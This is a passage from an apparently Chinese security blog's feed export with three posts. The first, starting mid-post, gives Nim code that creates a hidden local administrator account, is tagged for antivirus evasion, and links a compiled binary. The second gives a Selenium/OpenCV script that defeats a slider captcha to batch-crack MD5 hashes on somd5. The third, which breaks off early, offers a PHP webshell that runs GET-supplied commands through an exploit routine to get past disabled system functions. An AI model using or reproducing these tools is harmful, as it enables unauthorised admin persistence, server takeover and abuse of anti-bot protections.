class="hljs-type">USER_PRIV_USER</span><br>  )<br><br><span class="hljs-keyword">var</span> account = <span class="hljs-type">LOCALGROUP_MEMBERS_INFO_3</span>(<br>    lgrmi3_domainandname: user_info.usri1_name<br>  )<br><span class="hljs-keyword">var</span> dwError = <span class="hljs-type">DWORD</span> <span class="hljs-number">0</span><br><span class="hljs-type">NetUserAdd</span>(<span class="hljs-keyword">nil</span>, <span class="hljs-number">1</span>, <span class="hljs-keyword">cast</span>[<span class="hljs-type">LPBYTE</span>](&amp;user_info), &amp;dwError)<br><span class="hljs-type">NetLocalGroupAddMembers</span>(<span class="hljs-keyword">nil</span>, <span class="hljs-string">&quot;Administrators&quot;</span>, <span class="hljs-number">3</span>, <span class="hljs-keyword">cast</span>[<span class="hljs-type">LPBYTE</span>](&amp;account), <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>我是debian下交叉编译的windows的exe(踩了不少坑<br>这里说一下 <strong>debian</strong>下<strong>nim编译exe的流程</strong>(保姆级</p><h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><h2 id="STEP-1-安装"><a href="#STEP-1-安装" class="headerlink" title="STEP 1 安装"></a>STEP 1 安装</h2><p>安装 nim</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q">apt-<span class="hljs-built_in">get</span> install <span class="hljs-keyword">update</span><br>apt-<span class="hljs-built_in">get</span> install nim<br>apt-<span class="hljs-built_in">get</span> install gcc<br>nimble install https:<span class="hljs-comment">//gitee.com/best-ying/winim.git</span><br></code></pre></td></tr></table></figure><p>winim本来应该是<code>nimble install  winim</code>的 但是因为默认用的github的源 太慢了上不去 又不知道这么换源 就只好这样做 以后<strong>遇到这种问题都可以这么做</strong>:<br><code>nimble install 想安装的包的gitee上的地址</code> (gitee上有一个从github导入的地方 <strong>导入到自己仓库后就可以直接git clone</strong> 这样就是<strong>走国内的路线</strong>了 <strong>当然快</strong>)</p><p>然后继续安装</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> mingw-w64<br></code></pre></td></tr></table></figure><h2 id="STEP-2-编写-amp-编译运行-amp-打包exe"><a href="#STEP-2-编写-amp-编译运行-amp-打包exe" class="headerlink" title="STEP 2 编写&amp;编译运行&amp;打包exe"></a>STEP 2 编写&amp;编译运行&amp;打包exe</h2><p><strong>比如在 &#x2F;root&#x2F; 下写一个q.nim</strong><br><img src="/images/%E5%85%8D%E6%9D%80-nim%E7%AF%87/3.png"><br>然后输入以下<br><code>nim c --cpu:amd64 -d:mingw --app:gui now.nim</code><br><strong>cpu的这个地方的参数</strong> 可以为别的:<strong>i386</strong>   等其他<br>最后在同目录下 生成q.exe<br><img src="/images/%E5%85%8D%E6%9D%80-nim%E7%AF%87/4.png"></p><p><img src="/images/%E5%85%8D%E6%9D%80-nim%E7%AF%87/6.png"></p><p>这里懒 没有把 编译的拉到自己机子上试 直接wine了</p><p><strong>这里的代码直接换成上面给出的 然后改预制的用户名和密码即可</strong> 然后编译就行了 就有自己的exe啦</p><h1 id="结束语"><a href="#结束语" class="headerlink" title="结束语"></a>结束语</h1><p>成品下载地址(gitee):<br><a href="https://gitee.com/oagi/netuseraddbypass">https://gitee.com/oagi/netuseraddbypass</a></p>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>免杀</tag>
      
      <tag>nim</tag>
      
      <tag>bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>滑块验证码的对抗-somd5批量查询</title>
    <link href="/2021/08/02/%E6%BB%91%E5%9D%97%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%AF%B9%E6%8A%97&amp;somd5%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2/"/>
    <url>/2021/08/02/%E6%BB%91%E5%9D%97%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%AF%B9%E6%8A%97&amp;somd5%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2/</url>
    
    <content type="html"><![CDATA[<h2 id="起因"><a href="#起因" class="headerlink" title="起因"></a>起因</h2><p>最近刚接触了研究验证码对抗<br>刚好朋友说想搞<strong>somd5 批量查询</strong> 但是卡在了<strong>滑块验证码</strong>的认证上<br>于是:<strong>盘他</strong><br>学习了几篇别的大佬的操作 也有了几个尝试</p><h2 id="尝试"><a href="#尝试" class="headerlink" title="尝试:"></a>尝试:</h2><h3 id="采集信息"><a href="#采集信息" class="headerlink" title="采集信息:"></a>采集信息:</h3><p><img src="/images/%E6%BB%91%E5%9D%97%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%AF%B9%E6%8A%97&somd5%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2/1.png"></p><p><img src="/images/%E6%BB%91%E5%9D%97%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%AF%B9%E6%8A%97&somd5%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2/2.png"></p><p>移动了两次 发现<strong>ans</strong>的<strong>后面的值</strong>(<strong>110</strong>)始终没有变<br>然后这个滑块 x,y值中的<strong>Y始终是水平的</strong><br>所以猜<strong>ans是坐标</strong><br>只要传入<strong>缺口的坐标</strong>即可(缺口左上角顶点坐标<br>这里用<strong>cv2</strong>，网上<strong>借鉴</strong>了一下(读书人的事那能叫抄吗</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">identify_gap</span>(<span class="hljs-params">beijing,quekou</span>):<br> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> beijing: 背景图片</span><br><span class="hljs-string"> quekou: 缺口图片</span><br><span class="hljs-string"> &#x27;&#x27;&#x27;</span><br> <span class="hljs-comment"># 读取背景图片和缺口图片</span><br> beijing_img = cv2.imread(beijing) <span class="hljs-comment"># 背景图片</span><br> quekou_img = cv2.imread(quekou) <span class="hljs-comment"># 缺口图片</span><br>  <br> <span class="hljs-comment"># 识别图片边缘</span><br> beijing_edge = cv2.Canny(beijing_img, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>)<br> quekou_edge = cv2.Canny(quekou_img, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>)<br>  <br> <span class="hljs-comment"># 转换图片格式</span><br> beijing_pic = cv2.cvtColor(beijing_edge, cv2.COLOR_GRAY2RGB)<br> quekou_pic = cv2.cvtColor(quekou_edge, cv2.COLOR_GRAY2RGB)<br>  <br> <span class="hljs-comment"># 缺口匹配</span><br> res = cv2.matchTemplate(beijing_pic, quekou_pic, cv2.TM_CCOEFF_NORMED)<br> min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res) <span class="hljs-comment"># 寻找最优匹配</span><br>  <br> <span class="hljs-comment"># 绘制方框</span><br> th, tw = quekou_pic.shape[:<span class="hljs-number">2</span>] <br> tl = max_loc<br> <span class="hljs-comment"># 返回缺口的坐标(x</span><br> <span class="hljs-keyword">return</span> tl[<span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>然后<strong>return 的</strong>就是<strong>左上角缺口顶点的x</strong>(因为<strong>只需要x就可以计算偏移量</strong><br>但是由于我<strong>人傻</strong> 不知道怎么解决verify的请求问题 所以就放弃了直接request这条路，改用selenium(嘻嘻)，有兴趣的表哥可以试试</p><h3 id="使用selenium"><a href="#使用selenium" class="headerlink" title="使用selenium"></a>使用selenium</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():<br>    options = Options()<br>    options.binary_location = <span class="hljs-string">&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot;</span>    <span class="hljs-comment">#chrome binary location specified here</span><br>    options.add_argument(<span class="hljs-string">&quot;-enable-webgl&quot;</span>)<br>    options.add_argument(<span class="hljs-string">&quot;--no-sandbox&quot;</span>) <span class="hljs-comment">#bypass OS security model</span><br>    options.add_argument(<span class="hljs-string">&quot;--disable-dev-shm-usage&quot;</span>) <span class="hljs-comment">#overcome limited resource problems</span><br>    driver = webdriver.Chrome(options=options, executable_path=<span class="hljs-string">r&#x27;C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe&#x27;</span>)<br>    driver.get(<span class="hljs-string">&#x27;https://www.somd5.com/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> driver<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">url,file</span>):<br>    r = requests.get(url)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> code:<br>        code.write(r.content)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">driver,md5</span>):<br>    <span class="hljs-comment"># 定位查询按钮</span><br>    username = driver.find_element_by_id(<span class="hljs-string">&#x27;hash&#x27;</span>)<br>    username.clear()<br>    username.send_keys(md5)<br>    sleep(<span class="hljs-number">1</span>)<br><br><br>    <span class="hljs-comment"># 定位登录按钮</span><br>    btn = driver.find_element_by_id(<span class="hljs-string">&#x27;TencentCaptcha&#x27;</span>)<br>    btn.click()<br><br>    sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># 定位 iframe</span><br>    frame = driver.find_element_by_xpath(xpath=<span class="hljs-string">&#x27;//iframe&#x27;</span>)<br><br>    <span class="hljs-comment"># 切换到 iframe</span><br>    <span class="hljs-comment"># driver.switch_to_frame(frame)  # 这个方法也可以运行，但是会报错</span><br>    sleep(<span class="hljs-number">2</span>)<br>    driver.switch_to.frame(driver.find_element_by_xpath(<span class="hljs-string">&quot;/html/body/div[5]/iframe&quot;</span>))<br><br>    <span class="hljs-comment"># 定位滑动块</span><br>    test_button = driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;tcaptcha_drag_thumb&quot;]&#x27;</span>)<br><br>    <span class="hljs-comment">#获取大图 and 缺口 url</span><br>    big_img=driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div/div[3]/div[2]/div[1]/div[2]/img&#x27;</span>).get_attribute(<span class="hljs-string">&quot;src&quot;</span>)<br>    small_img=driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div/div[3]/div[2]/div[1]/div[3]/img&#x27;</span>).get_attribute(<span class="hljs-string">&quot;src&quot;</span>)<br>    download(big_img,<span class="hljs-string">&#x27;big_img.jpg&#x27;</span>)<br>    download(small_img,<span class="hljs-string">&#x27;small_img.png&#x27;</span>)<br>    <span class="hljs-comment">#print(big_img,small_img)#输出大图 &amp; 缺口链接</span><br>    <span class="hljs-comment"># 实例一个动作链对象</span><br>    action = ActionChains(driver)<br>    action.click_and_hold(on_element=test_button).perform()<span class="hljs-comment">#抓住滑块</span><br>    action.move_by_offset(xoffset=(identify_gap(<span class="hljs-string">&#x27;big_img.jpg&#x27;</span>,<span class="hljs-string">&#x27;small_img.png&#x27;</span>)-<span class="hljs-number">52</span>)/<span class="hljs-number">2</span>, yoffset=<span class="hljs-number">0</span>).perform()<span class="hljs-comment">#滑动</span><br>    test_button.click()<br>    <span class="hljs-comment">#print(identify_gap(&#x27;big_img.jpg&#x27;,&#x27;small_img.png&#x27;)) #输出680px的情况下的x坐标</span><br>    sleep(<span class="hljs-number">6</span>)<br>    result=driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[1]/div[2]/div[2]/div[2]/div/div[2]&#x27;</span>).get_attribute(<span class="hljs-string">&quot;innerHTML&quot;</span>)<br>    <span class="hljs-keyword">return</span> result<br>        <br>    <span class="hljs-comment"># 松开滑动</span><br><br></code></pre></td></tr></table></figure><p>大功告成！完整代码如下<br>使用时切记把要查的内容放在md5.txt里</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium.webdriver <span class="hljs-keyword">import</span> ActionChains<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">from</span> selenium.webdriver.chrome.options <span class="hljs-keyword">import</span> Options<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> cv2<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">init</span>():<br>    options = Options()<br>    options.binary_location = <span class="hljs-string">&quot;C:\Program Files (x86)\Google\Chrome\Application\chrome.exe&quot;</span>    <span class="hljs-comment">#chrome binary location specified here</span><br>    options.add_argument(<span class="hljs-string">&quot;-enable-webgl&quot;</span>)<br>    options.add_argument(<span class="hljs-string">&quot;--no-sandbox&quot;</span>) <span class="hljs-comment">#bypass OS security model</span><br>    options.add_argument(<span class="hljs-string">&quot;--disable-dev-shm-usage&quot;</span>) <span class="hljs-comment">#overcome limited resource problems</span><br>    driver = webdriver.Chrome(options=options, executable_path=<span class="hljs-string">r&#x27;C:\Program Files (x86)\Google\Chrome\Application\chromedriver.exe&#x27;</span>)<span class="hljs-comment">#改成自己的chromedriver所在位置</span><br>    driver.get(<span class="hljs-string">&#x27;https://www.somd5.com/&#x27;</span>)<br>    <span class="hljs-keyword">return</span> driver<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">download</span>(<span class="hljs-params">url,file</span>):<br>    r = requests.get(url)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> code:<br>        code.write(r.content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">identify_gap</span>(<span class="hljs-params">bg,tp</span>):<br> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"> bg: 背景图片</span><br><span class="hljs-string"> tp: 缺口图片</span><br><span class="hljs-string"> &#x27;&#x27;&#x27;</span><br> <span class="hljs-comment"># 读取背景图片和缺口图片</span><br> bg_img = cv2.imread(bg) <span class="hljs-comment"># 背景图片</span><br> tp_img = cv2.imread(tp) <span class="hljs-comment"># 缺口图片</span><br>  <br> <span class="hljs-comment"># 识别图片边缘</span><br> bg_edge = cv2.Canny(bg_img, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>)<br> tp_edge = cv2.Canny(tp_img, <span class="hljs-number">100</span>, <span class="hljs-number">200</span>)<br>  <br> <span class="hljs-comment"># 转换图片格式</span><br> bg_pic = cv2.cvtColor(bg_edge, cv2.COLOR_GRAY2RGB)<br> tp_pic = cv2.cvtColor(tp_edge, cv2.COLOR_GRAY2RGB)<br>  <br> <span class="hljs-comment"># 缺口匹配</span><br> res = cv2.matchTemplate(bg_pic, tp_pic, cv2.TM_CCOEFF_NORMED)<br> min_val, max_val, min_loc, max_loc = cv2.minMaxLoc(res) <span class="hljs-comment"># 寻找最优匹配</span><br>  <br> <span class="hljs-comment"># 绘制方框</span><br> th, tw = tp_pic.shape[:<span class="hljs-number">2</span>] <br> tl = max_loc<br> <span class="hljs-comment"># 返回缺口的坐标(x</span><br> <span class="hljs-keyword">return</span> tl[<span class="hljs-number">0</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">search</span>(<span class="hljs-params">driver,md5</span>):<br>    <span class="hljs-comment"># 定位查询按钮</span><br>    username = driver.find_element_by_id(<span class="hljs-string">&#x27;hash&#x27;</span>)<br>    username.clear()<br>    username.send_keys(md5)<br>    sleep(<span class="hljs-number">1</span>)<br><br><br>    <span class="hljs-comment"># 定位登录按钮</span><br>    btn = driver.find_element_by_id(<span class="hljs-string">&#x27;TencentCaptcha&#x27;</span>)<br>    btn.click()<br><br>    sleep(<span class="hljs-number">1</span>)<br><br>    <span class="hljs-comment"># 定位 iframe</span><br>    frame = driver.find_element_by_xpath(xpath=<span class="hljs-string">&#x27;//iframe&#x27;</span>)<br><br>    <span class="hljs-comment"># 切换到 iframe</span><br>    <span class="hljs-comment"># driver.switch_to_frame(frame)  # 这个方法也可以运行，但是会报错</span><br>    sleep(<span class="hljs-number">2</span>)<br>    driver.switch_to.frame(driver.find_element_by_xpath(<span class="hljs-string">&quot;/html/body/div[5]/iframe&quot;</span>))<br><br>    <span class="hljs-comment"># 定位滑动块</span><br>    test_button = driver.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;tcaptcha_drag_thumb&quot;]&#x27;</span>)<br><br>    <span class="hljs-comment">#获取大图 and 缺口 url</span><br>    big_img=driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div/div[3]/div[2]/div[1]/div[2]/img&#x27;</span>).get_attribute(<span class="hljs-string">&quot;src&quot;</span>)<br>    small_img=driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div/div[3]/div[2]/div[1]/div[3]/img&#x27;</span>).get_attribute(<span class="hljs-string">&quot;src&quot;</span>)<br>    download(big_img,<span class="hljs-string">&#x27;big_img.jpg&#x27;</span>)<br>    download(small_img,<span class="hljs-string">&#x27;small_img.png&#x27;</span>)<br>    <span class="hljs-comment">#print(big_img,small_img)#输出大图 &amp; 缺口链接</span><br>    <span class="hljs-comment"># 实例一个动作链对象</span><br>    action = ActionChains(driver)<br>    action.click_and_hold(on_element=test_button).perform()<span class="hljs-comment">#抓住滑块</span><br>    action.move_by_offset(xoffset=(identify_gap(<span class="hljs-string">&#x27;big_img.jpg&#x27;</span>,<span class="hljs-string">&#x27;small_img.png&#x27;</span>)-<span class="hljs-number">52</span>)/<span class="hljs-number">2</span>, yoffset=<span class="hljs-number">0</span>).perform()<span class="hljs-comment">#滑动</span><br>    test_button.click()<br>    <span class="hljs-comment">#print(identify_gap(&#x27;big_img.jpg&#x27;,&#x27;small_img.png&#x27;)) #输出680px的情况下的x坐标</span><br>    sleep(<span class="hljs-number">6</span>)<br>    result=driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/div[1]/div[2]/div[2]/div[2]/div/div[2]&#x27;</span>).get_attribute(<span class="hljs-string">&quot;innerHTML&quot;</span>)<br>    <span class="hljs-keyword">return</span> result<br>        <br>    <span class="hljs-comment"># 松开滑动</span><br> <br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    driver=init()<br>    f = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;md5.txt&quot;</span>)              <br>    line = f.readline()                <br>    <span class="hljs-keyword">while</span> line: <br>        result=search(driver,line)    <br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;result.txt&#x27;</span>,<span class="hljs-string">&#x27;a+&#x27;</span>) <span class="hljs-keyword">as</span> q:<br>            q.write(line.strip(<span class="hljs-string">&#x27;\n&#x27;</span>)+<span class="hljs-string">&quot;的查询结果:&quot;</span>+result+<span class="hljs-string">&#x27;\n&#x27;</span>)<br>        line = f.readline() <br>    f.close() <br><br></code></pre></td></tr></table></figure><h2 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h2><p>然后就能实现了:(效果视频链接)</p><p><img src="/images/%E6%BB%91%E5%9D%97%E9%AA%8C%E8%AF%81%E7%A0%81%E7%9A%84%E5%AF%B9%E6%8A%97&somd5%E6%89%B9%E9%87%8F%E6%9F%A5%E8%AF%A2/3.gif"></p>]]></content>
    
    
    <categories>
      
      <category>渗透学习</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Python</tag>
      
      <tag>验证码对抗</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>分享一个php下，linux下突破system命令限制的马</title>
    <link href="/2021/08/01/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAphp%E4%B8%8B%EF%BC%8Clinux%E4%B8%8B%E7%AA%81%E7%A0%B4system%E5%91%BD%E4%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E9%A9%AC%EF%BC%88%E6%96%B9%E6%B3%95%EF%BC%89/"/>
    <url>/2021/08/01/%E5%88%86%E4%BA%AB%E4%B8%80%E4%B8%AAphp%E4%B8%8B%EF%BC%8Clinux%E4%B8%8B%E7%AA%81%E7%A0%B4system%E5%91%BD%E4%BB%A4%E9%99%90%E5%88%B6%E7%9A%84%E9%A9%AC%EF%BC%88%E6%96%B9%E6%B3%95%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>然后只要get传入<br>cmd&#x3D;xxx<br>比如cmd&#x3D;whoami<br>然后就能实现了</p><span id="more"></span><p>&lt;&gt;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cmd</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;cmd&quot;</span>];<br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> 